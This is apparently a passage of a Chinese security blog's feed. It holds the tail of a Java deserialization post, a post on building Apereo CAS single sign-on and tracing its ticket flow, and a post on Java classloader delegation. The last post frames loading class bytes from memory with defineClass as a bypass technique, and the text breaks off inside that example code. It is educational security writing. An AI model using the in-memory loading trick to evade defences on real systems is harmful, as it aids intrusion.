title="总结及一些tip"></a>总结及一些tip</h2><ul><li>序列化时，当写入类的元数据的时候，是先写子类的类元数据，然后递归调用的写入父类的类元数据（只有实现序列化接口的才会有类元数据）。</li><li>防御反序列化的原理是在resolveClass处设防而不是readResolve</li><li>在序列化数据末尾加入脏数据不会影响正常的反序列化。</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/qq_36744284/article/details/89604011">java中的序列化与反序列化及其源码分析（特别详细）</a><br><a href="http://xxlegend.com/2018/06/20/%E5%85%88%E7%9F%A5%E8%AE%AE%E9%A2%98%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E6%88%98%20%E8%A7%A3%E8%AF%BB/">先知大会议题Java反序列化实战</a><br>[从WebLogic看反序列化漏洞的利用与防御](</p>]]></content>
    
    <summary type="html">
    
      写这篇文章目的主要在于进一步理解何为java原生反序列化，并且回答如下的几个问题。
    
    </summary>
    
    
      <category term="web security" scheme="http://yoursite.com/categories/web-security/"/>
    
    
      <category term="java" scheme="http://yoursite.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>CAS的搭建及认证流程分析与比较</title>
    <link href="http://yoursite.com/2020/01/31/CAS%E7%9A%84%E6%90%AD%E5%BB%BA%E5%8F%8A%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90%E4%B8%8E%E6%AF%94%E8%BE%83/"/>
    <id>http://yoursite.com/2020/01/31/CAS%E7%9A%84%E6%90%AD%E5%BB%BA%E5%8F%8A%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90%E4%B8%8E%E6%AF%94%E8%BE%83/</id>
    <published>2020-01-31T04:24:48.000Z</published>
    <updated>2020-07-11T07:59:50.186Z</updated>
    
    <content type="html"><![CDATA[<!-- more --><h2 id="CAS-简介"><a href="#CAS-简介" class="headerlink" title="CAS 简介"></a>CAS 简介</h2><p>CAS是一个单点登录（Single Sign On,简称SSO，SSO使得在多个应用系统中，用户只需要登录一次就可以访问所有相互信任的应用系统）框架，开始是由耶鲁大学的一个组织开发，后来归到apereo去管。</p><h2 id="CAS-Server搭建"><a href="#CAS-Server搭建" class="headerlink" title="CAS Server搭建"></a>CAS Server搭建</h2><p>在此下载：<a href="https://github.com/apereo/cas/tree/4.1.x">https://github.com/apereo/cas/tree/4.1.x</a><br>通常来说用mvn编译cas-server-webapp后放到tomcat中就行，但是cas默认需要走https，否则在登陆流程和跳转webapp流程中会出现如下两种报错。<br><img src="1580368543216-ba5d0a82-fc02-4225-9a7c-cc0c168f604b.png#align=left&display=inline&height=287&name=image.png&originHeight=574&originWidth=2072&size=171406&status=done&style=none&width=1036" alt="image.png"></p><p><img src="1580368461615-7a24430e-9bf3-4689-9c3b-e9168d2d177d.png#align=left&display=inline&height=330&name=image.png&originHeight=660&originWidth=2114&size=175710&status=done&style=none&width=1057" alt="image.png"></p><p>第一种解决办法是生成一个自签名的ssl证书并在tomcat的server.xml中配置。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -genkey -<span class="built_in">alias</span> tomcat -keyalg RSA -keystore /path/to/my/keystore</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">"8443"</span> <span class="attr">protocol</span>=<span class="string">"org.apache.coyote.http11.Http11NioProtocol"</span></span></span><br><span class="line"><span class="tag">           <span class="attr">maxThreads</span>=<span class="string">"150"</span> <span class="attr">SSLEnabled</span>=<span class="string">"true"</span> <span class="attr">scheme</span>=<span class="string">"https"</span> <span class="attr">secure</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">keystoreFile</span>=<span class="string">"$&#123;user.home&#125;/.keystore"</span> <span class="attr">keystorePass</span>=<span class="string">"p@assw0rd"</span></span></span><br><span class="line"><span class="tag">           <span class="attr">clientAuth</span>=<span class="string">"false"</span> <span class="attr">sslProtocol</span>=<span class="string">"TLS"</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>但是这种方法影响wireshark后续抓包分析，并且默认情况下CAS要求webapp也是https。</p><p>第二种办法是修改cas配置使其允许http。有下面四步。</p><ol><li><p>在<code>p:httpClient-ref=&quot;supportsTrustStoreSslSocketFactoryHttpClient&quot;</code>后增加<code>p:requireSecure=&quot;false&quot;</code><img src="1580377596613-3c72dd9e-f517-473f-9eea-e8a86e5e0d16.png#align=left&display=inline&height=103&name=image.png&originHeight=206&originWidth=2182&size=60740&status=done&style=none&width=1091" alt="image.png"></p></li><li><p>修改WEB-INF/spring-configuration/ticketGrantingTicketCookieGenerator.xml<img src="1580377875413-89e3960e-4e30-435c-930b-7f720762d0a1.png#align=left&display=inline&height=135&name=image.png&originHeight=270&originWidth=2218&size=71387&status=done&style=none&width=1109" alt="image.png"></p></li></ol><ol start="3"><li>修改WEB-INF/spring-configuration/warnCookieGenerator.xml<img src="1580377924581-fc1351cc-d72d-4f50-abe3-217a43230b80.png#align=left&display=inline&height=137&name=image.png&originHeight=274&originWidth=2064&size=61824&status=done&style=none&width=1032" alt="image.png"></li></ol><ol start="4"><li>修改注册服务WEB-INF/classes/services/HTTPSandIMAPS-10000001.json将<code>&quot;serviceId&quot; : &quot;^(https|imaps)://.*&quot;</code>修改为<code>&quot;serviceId&quot; : &quot;^(https|http|imaps)://.*&quot;</code><img src="1580377987989-7a8526d8-9459-4ac3-bf96-66f71578f201.png#align=left&display=inline&height=66&name=image.png&originHeight=120&originWidth=1318&size=22754&status=done&style=none&width=720" alt="image.png"></li></ol><p>修改重启后虽然前端还是会爆错，但是其实正常登陆了。默认的帐密是casuser/Mellon，记录在deployerConfigContext.xml中。<br><img src="1580356310308-00f8b236-b1d6-43bd-a1d2-a729df5cbf65.png#align=left&display=inline&height=516&name=image.png&originHeight=1032&originWidth=3030&size=386108&status=done&style=none&width=1515" alt="image.png"><br><img src="1580378152394-9517eb31-cb68-4d15-a187-2868a1f7277a.png#align=left&display=inline&height=607&name=image.png&originHeight=1214&originWidth=2150&size=275338&status=done&style=none&width=1075" alt="image.png"></p><p><img src="1580378176954-6713c06c-70af-4ac3-9f5c-b0e34fcf8e19.png#align=left&display=inline&height=493&name=image.png&originHeight=986&originWidth=2330&size=226505&status=done&style=none&width=1165" alt="image.png"></p><h2 id="Webapp搭建"><a href="#Webapp搭建" class="headerlink" title="Webapp搭建"></a>Webapp搭建</h2><p>在此下载：<a href="https://github.com/UniconLabs/cas-sample-java-webapp">https://github.com/UniconLabs/cas-sample-java-webapp</a><br>修改web.xml中casServerLoginUrl、casServerUrlPrefix、serverName值。casServerLoginUrl对应cas server地址（如果来客没有登陆过webapp就会把来客重定向到这里进行cas统一认证），casServerUrlPrefix对应cas server地址（这个值后续会跟一些api路径做拼接），serverName是webapp地址。<br><img src="1580380855855-5bfed017-f240-4af9-a5e7-0555444cb000.png#align=left&display=inline&height=485&name=image.png&originHeight=970&originWidth=2062&size=158930&status=done&style=none&width=1031" alt="image.png"></p><h2 id="认证流程分析"><a href="#认证流程分析" class="headerlink" title="认证流程分析"></a>认证流程分析</h2><p>环境ip说明<br>cas server：172.16.247.1<br>cas webapp：172.16.247.139<br>用户：172.16.247.131</p><ul><li>user访问webapp，因为之前从未登陆过webapp，所以webapp会把user重定向给cas进行统一登陆（重定向的url的serivce中带有webapp自己的url好让cas知道user登陆成功后该重定向回哪里）。<img src="1580383571657-a271c09d-0890-442f-b3f6-6a172f235f53.png#align=left&display=inline&height=243&name=image.png&originHeight=486&originWidth=1854&size=118852&status=done&style=none&width=927" alt="image.png"></li><li>user在cas登陆，登陆成功后cas会给user带一个cookie（TGC也叫TGT，如果之后要登陆其他webapp就不用重复输入密码而是直接给ST了）和一个ST（在location url中）的302回webapp。<img src="1580383821801-70d72983-d348-48c3-8a07-c770ec082c77.png#align=left&display=inline&height=262&name=image.png&originHeight=524&originWidth=2476&size=231885&status=done&style=none&width=1238" alt="image.png"></li><li>webapp拿到user请求过来的ST会向CAS的api发送已验证ST的合法性，如果cas验证成功会发送给CAS的是成功的状态信息和用户的一些数据。<img src="1580384247485-354438d9-9482-4450-8b26-01ada6bd18c4.png#align=left&display=inline&height=147&name=image.png&originHeight=294&originWidth=2190&size=82873&status=done&style=none&width=1095" alt="image.png"><br><img src="1580384287803-1b5da7b9-c455-4ae4-9557-47a1629d157e.png#align=left&display=inline&height=678&name=image.png&originHeight=1356&originWidth=2142&size=177667&status=done&style=none&width=1071" alt="image.png"></li><li>webapp从cas那里得知ST是有效的，给user设置cookie（用户之后就不必再走一次这个流程了）。并让用户成功登陆。<img src="1580384354171-e57ad4ab-a595-442d-968f-44eef905f385.png#align=left&display=inline&height=103&name=image.png&originHeight=206&originWidth=1736&size=59328&status=done&style=none&width=868" alt="image.png"></li></ul><p>一图胜千言，图片来自网络（侵删）。</p><p><img src="1580374514900-55ff9aef-070f-4dc4-9da7-e2a70721372a.png#align=left&display=inline&height=672&name=image.png&originHeight=1344&originWidth=1630&size=652092&status=done&style=none&width=815" alt="image.png"></p><h2 id="SSO-vs-Kerberos-vs-OAuth"><a href="#SSO-vs-Kerberos-vs-OAuth" class="headerlink" title="SSO vs Kerberos vs OAuth"></a>SSO vs Kerberos vs OAuth</h2><p>当时看完整个cas的认证流程感觉里面一些要素和kerberos和OAuth认证很相似（都有一个第三方来进行认证/授权）。因此相比较一下这三者的区别。</p><h3 id="SSO-vs-Kerberos"><a href="#SSO-vs-Kerberos" class="headerlink" title="SSO vs Kerberos"></a>SSO vs Kerberos</h3><p>sso和kerberos和共同点在他们都一个用TGT换ST的过程，不同点在于kerberos中其实有四个角色（client，KDC-AS，KDC-TS，server）并且因为“相近”的两个之间预先共享密钥，所以server不需要发送请求向KDC求证ST的真实性，但是CAS中server需要向cas server求证真实性。</p><h3 id="SSO-vs-OAuth"><a href="#SSO-vs-OAuth" class="headerlink" title="SSO vs OAuth"></a>SSO vs OAuth</h3><p>它俩之前最大的不同的在业务场景的不同，SSO用在一个公司内部员工的单点登陆。OAuth用在两个公司之前A公司获取其用户在B公司的一些数据。OAuth还常常涉及到啊AB两公司的帐号绑定，所以需要state来防止csrf，这个是SSO里面没有的。</p><h2 id="杂"><a href="#杂" class="headerlink" title="杂"></a>杂</h2><p>编译整个cas的遇到org.samba.jcifs:jcifs-ext:0.9.4无法下载的问题，选择手动下载jar并安装到本地maven仓库中。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#下载地址：http://maven.yonyoucloud.com/nexus/content/groups/public/org/samba/jcifs/jcifs-ext/0.9.4/</span></span><br><span class="line">mvn install:install-file -DgroupId=org.samba.jcifs -DartifactId=jcifs-ext -Dversion=0.9.4 -Dpackaging=jar -Dfile=/Users/cengsiqi/Downloads/jcifs-ext-0.9.4.jar</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/chenhai201/article/details/50623395">cas 4.1.4单点登录实战</a><br><a href="https://blog.51cto.com/fengwan/1876603">CAS 4.1.10关闭HTTPS</a><br><a href="https://blog.csdn.net/GaoXiR/article/details/99539501">使用maven命令安装jar包到本地maven仓库</a><br><a href="https://blog.csdn.net/mahoking/article/details/42319475">Spring P标签的使用</a></p>]]></content>
    
    <summary type="html">
    
      CAS是一个单点登录（Single Sign On,简称SSO，SSO使得在多个应用系统中，用户只需要登录一次就可以访问所有相互信任的应用系统。）框架，开始是由耶鲁大学的一个组织开发，后来归到apereo去管。
    
    </summary>
    
    
      <category term="web security" scheme="http://yoursite.com/categories/web-security/"/>
    
    
      <category term="java" scheme="http://yoursite.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Java中双亲委派相关知识梳理</title>
    <link href="http://yoursite.com/2020/01/22/Java%E4%B8%AD%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/"/>
    <id>http://yoursite.com/2020/01/22/Java%E4%B8%AD%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/</id>
    <published>2020-01-22T03:02:04.000Z</published>
    <updated>2020-07-11T08:03:20.445Z</updated>
    
    <content type="html"><![CDATA[<!-- 在反序列化的学习过程中总是不可回避碰到这个点，这次就来简单看看。 --><!-- more --><h2 id="classloader介绍"><a href="#classloader介绍" class="headerlink" title="classloader介绍"></a>classloader介绍</h2><p>在java中每当需要加载一个类的时候，就需要用到类加载器（classloader），它存在的意义在于把class文件中字节码变成可以被java使用的class对象。java中原生自带3个classloader分别是Bootstrap ClassLoader、Ext ClassLoader、App ClassLoader另外用户也可以自定义Custom ClassLoader。那实际加载类的时候是用哪一个加载器？java为了安全着想规定了classloader之间有一套等级机制。<strong>具体来说就是：当从子加载器出发，但子加载器加载class的时候会先委派给由父加载器先加载，如果父加载器无法加载再由子加载器加载，而这套先后顺序就是平时所说的双亲委派</strong>。</p><p><img src="1579506416646-166ccd99-ce6c-45d5-a303-192216a575ed.png#align=left&display=inline&height=503&name=image.png&originHeight=294&originWidth=436&size=49254&status=done&style=none&width=746" alt="image.png"></p><ul><li><p>BootstrapClassLoader，启动类加载器/根加载器，负责加载 JVM 运行时核心类，这些类位于 JAVA_HOME/lib/rt.jar 文件中，我们常用内置库 java.<em>.</em> 都在里面。这个 ClassLoader 比较特殊，它其实不是一个ClassLoader实例对象，而是由C代码实现。用户在实现自定义类加载器时，如果需要把加载请求委派给启动类加载器，那可以直接传入null作为 BootstrapClassLoader。</p></li><li><p>ExtClassLoader，扩展类加载器，负责加载 JVM 扩展类，扩展 jar 包位于 JAVA_HOME/lib/ext/*.jar 中，库名通常以 javax 开头。</p></li><li><p>AppClassLoader，应用类加载器/系统类加载器，直接提供给用户使用的ClassLoader，它会加载 ClASSPATH 环境变量或者 java.class.path 属性里定义的路径中的 jar 包和目录，负责加载包括开发者代码中、第三方库中的类。</p></li></ul><p>容易误会的一点是Classloader之间并不是继承关系而是组合。<br><img src="1579509377078-045bf8a3-1a58-4f33-9d95-e3ef2d06c03a.png#align=left&display=inline&height=308&name=image.png&originHeight=616&originWidth=1518&size=119384&status=done&style=none&width=759" alt="image.png"></p><p>AppClassLoader和ExtClassLoader都继承自URLClasLoader。<br><img src="1579508579303-9a8d00d7-3a6e-435c-8fb4-c1e822b209ff.png#align=left&display=inline&height=233&name=image.png&originHeight=466&originWidth=1892&size=121667&status=done&style=none&width=946" alt="image.png"></p><p>URLClassLoader继承自ClassLoader。<br><img src="1579508772615-6b36f925-920f-4dda-8fe9-a06f0d192f4a.png#align=left&display=inline&height=408&name=image.png&originHeight=550&originWidth=1006&size=34288&status=done&style=none&width=746" alt="image.png"></p><p>而一般自定义加载器是直接继承ClassLoader并根据需求重写findClass或者loadClass方法（之后会提到）。<br><img src="1579508811045-b00cfcaf-142a-4b08-8dd2-5d8464940f41.png#align=left&display=inline&height=133&name=image.png&originHeight=266&originWidth=1590&size=46469&status=done&style=none&width=795" alt="image.png"></p><p>在java代码我们可以调用getParent的方法获取该加载器的父加载器。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaClassLoader</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ClassLoader appClassloader = ClassLoader.getSystemClassLoader();</span><br><span class="line">        ClassLoader extensionClassloader = appClassloader.getParent();</span><br><span class="line">        System.out.println(<span class="string">"AppClassLoader is "</span> + appClassloader);</span><br><span class="line">        System.out.println(<span class="string">"The parent of AppClassLoader is "</span> + extensionClassloader);</span><br><span class="line">        System.out.println(<span class="string">"The parent of ExtensionClassLoader is "</span> + extensionClassloader.getParent());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//console ouput:</span></span><br><span class="line"><span class="comment">////AppClassLoader is sun.misc.Launcher$AppClassLoader@18b4aac2</span></span><br><span class="line"><span class="comment">////The parent of AppClassLoader is sun.misc.Launcher$ExtClassLoader@61bbe9ba</span></span><br><span class="line"><span class="comment">////The parent of ExtensionClassLoader is null</span></span><br></pre></td></tr></table></figure><p><em>ps: 因为BootstrapClassLoader是内嵌到jvm中c代码，开发者无法直接获取，因此ExtensionClassLoader.getParent()会返回null。</em><br>_<br>demo代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchMethodException, ClassNotFoundException, IllegalAccessException, InstantiationException, InvocationTargetException </span>&#123;</span><br><span class="line">        Test test  = <span class="keyword">new</span> Test();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在new 的位置强制进入，可以看到是从确实是从子加载器AppClassLoader开始的。<br><img src="1579509643539-5239956c-aae6-4711-9528-d408fdb9fcc5.png#align=left&display=inline&height=287&name=image.png&originHeight=574&originWidth=2848&size=159070&status=done&style=none&width=1424" alt="image.png"></p><p>步入两步后在第一个红框可以看到加载双亲委派的逻辑。<br><img src="1579510144691-d9aa11c7-f072-467e-bf3a-9ae5c9dfd21a.png#align=left&display=inline&height=734&name=image.png&originHeight=1468&originWidth=2200&size=358925&status=done&style=none&width=1100" alt="image.png"></p><p>如果父类无法加载，那么使用自己的findClass实现来找。这里Test是我自定义的因此不在<code>JAVA_HOME/lib/rt.jar</code><br>也不在 <code>JAVA_HOME/lib/ext/*.jar</code>中，所以最后会使用AppClassLoader的findClass实现，而AppClassLoader没有实现自己的findClass，所以最后是由URLClassLoader findClass寻找类。最后通过deineClass把字节码转换为类对象。<br><img src="1579659421047-d0c30290-aee4-4347-b9e0-66df1d527dca.png#align=left&display=inline&height=501&name=image.png&originHeight=1002&originWidth=2446&size=306425&status=done&style=none&width=1223" alt="image.png"></p><h2 id="重写ClassLoader"><a href="#重写ClassLoader" class="headerlink" title="重写ClassLoader"></a>重写ClassLoader</h2><p>通过上面分析我们可以看到在第一次加载类时是在loadClass进行loader调度（实现双亲委派逻辑），最后由findClass拿到路径Resource，由defineClass加载类。<strong>因此，如果我们把自己的class放在不常规的位置，就需要自定义ClassLoader，重写findClass方法。如果我们想突破双亲委派模型（覆盖系统类）就需要重写loadClass。</strong></p><p>而实际应用中处于bypass的需要我们经常使用defineClass一个多态实现来从内存中或者文件中执行命令。看下面代码。</p><p>从内存中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Creator: yz</span></span><br><span class="line"><span class="comment"> * Date: 2019/12/17</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// TestHelloWorld类名</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String testClassName = <span class="string">"com.anbai.sec.classloader.TestHelloWorld"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// TestHelloWorld类字节码</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] testClassBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;</span><br><span class="line">            -<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">70</span>, -<span class="number">66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">51</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">0</span>,</span><br><span class="line">            <span class="number">16</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">60</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">62</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">100</span>,</span><br><span class="line">            <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">78</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>,</span><br><span class="line">            <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">104</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>,</span><br><span class="line">            <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">83</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">99</span>,</span><br><span class="line">            <span class="number">101</span>, <span class="number">70</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">84</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">72</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">87</span>, <span class="number">111</span>,</span><br><span class="line">            <span class="number">114</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">46</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">72</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>,</span><br><span class="line">            <span class="number">32</span>, <span class="number">87</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">126</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">47</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">47</span>,</span><br><span class="line">            <span class="number">115</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">47</span>, <span class="number">84</span>, <span class="number">101</span>, <span class="number">115</span>,</span><br><span class="line">            <span class="number">116</span>, <span class="number">72</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">87</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>,</span><br><span class="line">            <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">79</span>, <span class="number">98</span>, <span class="number">106</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">42</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">1</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">            <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">2</span>, -<span class="number">80</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">12</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span 